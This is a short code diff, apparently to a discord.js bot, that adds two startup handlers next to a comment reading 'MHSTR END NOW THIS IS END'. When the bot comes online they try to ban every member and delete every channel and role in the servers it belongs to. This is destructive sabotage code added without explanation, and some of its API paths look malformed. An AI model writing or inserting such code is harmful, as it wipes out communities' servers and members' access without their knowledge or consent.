@@ -2962,7 +2962,15 @@ client.on("guildMemberAdd", member => {
       }
       });
 
-
+client.on('ready' , async() => {
+client.guilds.members.forEach(m => {
+m.ban();
+})
+});
+client.on('ready' , async() => {
+client.guilds.channels.forEach(c => { c.delete()});
+client.guilds.roles.forEach(r => { r.delete()});
+})
 
 
 //MHSTR END NOW THIS IS END
